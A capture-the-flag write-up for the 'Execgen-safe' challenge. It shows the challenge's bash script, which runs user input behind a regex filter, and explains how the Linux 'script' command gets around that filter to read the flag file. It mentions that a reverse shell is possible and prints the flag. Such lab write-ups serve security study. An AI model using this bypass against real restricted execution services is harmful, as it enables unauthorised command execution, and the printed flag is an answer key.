# Execgen-safe writeup

## Task

Execgen with input character limit.

```bash
#!/bin/bash
IFS=''
regex='^[A-Za-z0-9 /]*$'

banner='
___________                      ________
\_   _____/__  ___ ____   ____  /  _____/  ____   ____
 |    __)_\  \/  // __ \_/ ___\/   \  ____/ __ \ /    \
 |        \>    <\  ___/\  \___\    \_\  \  ___/|   |  \
/_______  /__/\_ \\___  >\___  >\______  /\___  >___|  /
        \/      \/    \/     \/        \/     \/     \/ (safe version)
Create your script: '

echo -n $banner

# create the script, easy!
read -r script

# for your safety
if ! [[ $script =~ $regex ]]; then
  echo "Hacker is not allowed to use the tool!"
  exit 0
fi

# oh, don't forget to add watermark!
script+='(created by execgen)'

# run the script for you, sweet!
tmp=$(mktemp)
echo "#!$script" > "$tmp"
chmod 0755 "$tmp"
out=$("$tmp")
echo "$out"
rm "$tmp"

```

## Writeup

The main idea of the solution is inspired from [here](https://hackmd.io/@dalun/rkmKeDd5s#Revenge).

### Solution

I'll present the solution straightforwardly.

The main exploit command is [`script`](https://man7.org/linux/man-pages/man1/script.1.html)

Once we entered "script session", the regex check is bypassed. And the I/O history of the bash session is stored in certain file.

### POC

Here I provide two POC.

#### cat the history

First connect and type`/bin/script /tmp/`, press enter and we are in script mode. The I/O history is stored in `/tmp/(created by execgen)`

Then we type `cat home/chal/flag`, press enter and press `ctrl + c` to leave session.

Finally we connect back with command `/bin/cat /tmp/` and we get the flag.

#### Make reverse shell great again!

The check is disabled in the script mode, so we can execute everything we want, including reverse shell. And the rest is easy.

```
chal@91d229b36ac7:/$ cat home/chal/flag
cat home/chal/flag
FLAG{7h3_5p4c3_i5_l1m1t3d}
chal@91d229b36ac7:/$                                                                              

```

### Notes

1. The connection session is about 30 seconds so we must be quick(?)

2. Cool `script` command.

### Flag

`FLAG{7h3_5p4c3_i5_l1m1t3d}`
